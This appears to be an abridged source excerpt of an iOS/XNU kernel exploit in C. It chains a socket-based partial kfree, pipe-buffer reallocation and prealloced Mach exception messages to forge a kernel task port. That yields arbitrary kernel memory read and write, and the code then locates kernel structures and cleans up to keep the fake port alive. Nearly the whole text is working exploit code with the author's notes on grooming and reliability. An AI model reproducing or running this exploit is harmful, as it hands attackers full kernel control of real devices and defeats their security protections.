...
void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes) {
  ...
  *(uint64_t *)(((uint8_t *)sockaddr_src) + koffset(KFREE_ADDR_OFFSET)) = kaddr;
  ...
  int err = connectx(fd, &eps, SAE_ASSOCID_ANY, 0, NULL, 0, NULL, NULL);
...
int alloc_and_fill_pipe() {
  ...
  return read_end; // the buffer is actually hanging off the read end struct
                   // pipe
}
...
mach_port_t fake_kalloc(int size) {
  ...
  err = mach_msg(&msg->hdr, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg_size, 0,
...
void fake_kfree(mach_port_t port) { mach_port_destroy(mach_task_self(), port); }

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_NONE 0

void build_fake_task_port(uint8_t *fake_port, uint64_t fake_port_kaddr,
  ...
  *(uint32_t *)(fake_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) =
      0xf00d; // leak references
  *(uint32_t *)(fake_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) =
      0xf00d; // leak srights
  ...
  *(uint32_t *)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) =
      0xd00d; // leak references
...
/*
 * Things are easier and more stable if we can get the reallocated message
 * buffer to be a pre-alloced one as it won't be freed when we receive the
 * message. This gives us one fewer places where we need to control the
 * reallocation of an object (a source of unreliability.)
 *
 * Ideally we'd like to use this ipc kmsg to also give us a useful kernel
 * pointer to help us build the arbitrary r/w. If we can get a send right to the
 * host port in the kmsg we can use that as a building block to find the kernel
 * task port from which we can copy all the stuff we need to build a "fake"
 * kernel task port.
 *
 * There aren't that many places where we can get the kernel to send a message
 * containing a port we control. One option is to use exception messages; we can
 * actually get the kernel to use arbitrary ports as the task and thread ports.
 */
...
extern boolean_t exc_server(mach_msg_header_t *InHeadP,
...
void *ian_do_thread(void *arg) {
  ...
  err = thread_set_exception_ports(
      mach_thread_self(), EXC_MASK_ALL, exception_port,
  ...
  // make the thread port which gets sent in the message actually be the host
  // port
  err = thread_set_special_port(mach_thread_self(), THREAD_KERNEL_PORT,
                                mach_host_self());
  if (err != KERN_SUCCESS) {
...
void ian_send_prealloc_msg(mach_port_t port) {
  ...
  // pthread when we receive the exception message and it exits:
  kern_return_t err =
      mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
  if (err != KERN_SUCCESS) {
...
mach_port_t ian_receive_prealloc_msg(mach_port_t port) {
  kern_return_t err = mach_msg_server_once(exc_server, sizeof(union max_msg),
  ...
  pthread_t t;
  err =
      mach_port_get_context(mach_task_self(), port, (mach_port_context_t *)&t);
  pthread_join(t, NULL);
...
mach_port_t prepare_early_read_primitive(uint64_t pipe_buffer_kaddr,
                                         int pipe_read_end, int pipe_write_end,
                                         mach_port_t replacer_port,
  ...
  build_fake_task_port(original_contents + fake_port_offset, fake_port_kaddr,
                       early_read_pipe_buffer_kaddr, 0, 0);
...
uint32_t early_rk32(uint64_t kaddr) {
  ...
  // no need to actually build it again, but this read function will only be
  // used a handful of times during bootstrap

  uint64_t fake_port_offset = 0x100; // where in the pipe/ipc_kmsg to put it
  uint64_t fake_port_kaddr = early_read_pipe_buffer_kaddr + fake_port_offset;

  build_fake_task_port(pipe_contents + fake_port_offset, fake_port_kaddr, kaddr,
                       0, 0);
...
mach_port_t prepare_tfp0(uint64_t vm_map, uint64_t receiver) {
  ...
  build_fake_task_port(pipe_contents + fake_port_offset, fake_port_kaddr,
                       0x4848484848484848, vm_map, receiver);
...
void prepare_for_rw_with_fake_tfp0(mach_port_t new_tfp0) { tfp0 = new_tfp0; }

void wk32(uint64_t kaddr, uint32_t val) {
  if (tfp0 == MACH_PORT_NULL) {
    printf("attempt to write to kernel memory before any kernel memory write "
  ...
  kern_return_t err;
  err = mach_vm_write(tfp0, (mach_vm_address_t)kaddr, (vm_offset_t)&val,
...
uint32_t rk32(uint64_t kaddr) {
  ...
  err = mach_vm_read_overwrite(tfp0, (mach_vm_address_t)kaddr,
                               (mach_vm_size_t)sizeof(uint32_t),
                               (mach_vm_address_t)&val, &outsize);
  if (err != KERN_SUCCESS) {
...
void brewbeer() {
  ...
  // to improve the probability we are the one who gets to reuse the free'd
  // alloc lets free two things such that they both hopefully end up on the
  // all_free list and lets put a bunch of stuff on the intermediate list.
  ...
  // we still don't know which of our exception ports has the correct prealloced
  // message buffer, so try sending to each in turn until we hit the right one:
  ...
  for (int i = 0; i < 100; i++) {
    ...
    if (memcmp(original_contents, new_contents, PIPE_SIZE) == 0) {
      ...
      mach_port_t fake_thread_port =
          ian_receive_prealloc_msg(exception_ports[i]);
      printf("received prealloc message via an exception with this thread "
             "port: %x\n",
             fake_thread_port);
      ...
      // different! we found the right exception port which has its prealloced
      // port overlapping
  ...
  // prepare_early_read_primitive will overwrite this, lets save it now for
  // later
  ...
  mach_port_t kport = prepare_early_read_primitive(
      pipe_buf, replacer_pipe, replacer_pipe + 1, replacer_port, new_contents);

  uint32_t val = early_rk32(pipe_buf);
  printf("%08x\n", val);

  // for the full read/write primitive we need to find the kernel vm_map and the
  // kernel ipc_space we can get the ipc_space easily from the host port
  // (receiver field):
  uint64_t ipc_space_kernel = early_rk64(
      host_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));

  printf("ipc_space_kernel: %016llx\n", ipc_space_kernel);

  // the kernel vm_map is a little trickier to find
  // we can use the trick from mach_portal to find the kernel task port because
  // we know it's gonna be near the host_port on the heap:

  // find the start of the zone block containing the host and kernel task
  // pointers:
  ...
  // now look through up to 0x4000 of ports and find one which looks like a task
  // port:
  for (int i = 0; i < (0x4000 / 0xa8); i++) {
    uint64_t early_port_kaddr = first_port + (i * 0xa8);
    uint32_t io_bits =
        early_rk32(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
    ...
    uint64_t task_t = early_rk64(early_port_kaddr +
  ...
  kern_return_t err =
      mach_vm_read(new_tfp0, kernel_vm_map, 0x40, &data_out, &out_size);
  if (err != KERN_SUCCESS) {
  ...
  // time to clean up
  // if we want to exit cleanly and keep the fake tfp0 alive we need to remove
  // all reference to the memory it uses. it's reference three times: 1) the
  // early_kalloc mach_message which was used to get the 16MB aligned allocation
  // on to the free list in the first place 2) the replacer_pipe buffer 3) the
  // replacer_port prealloced message

  // we also want to do this without using any kernel text offsets (only
  // structure offsets) as a starting point we want the task port; we actually
  // do know where this is because the exception messages contained it

  // for 1 & 3 we need to look through the task's mach port table
  uint64_t task_kaddr =
      rk64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  uint64_t itk_space =
      rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
  uint64_t is_table =
      rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));

  uint32_t is_table_size =
      rk32(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
  ...
  for (uint32_t i = 0; i < is_table_size; i++) {
    ...
    uint64_t kmsg =
        rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    if (kmsg == pipe_buf) {
      // neuter it:
    ...
    uint32_t ip_bits =
        rk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
#define IP_BIT_PREALLOC 0x00008000
    if (ip_bits & IP_BIT_PREALLOC) {
      uint64_t premsg =
          rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG));
      if (premsg == pipe_buf) {
        // clear the premsg:
  ...
  uint64_t ofiles_base =
      rk64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
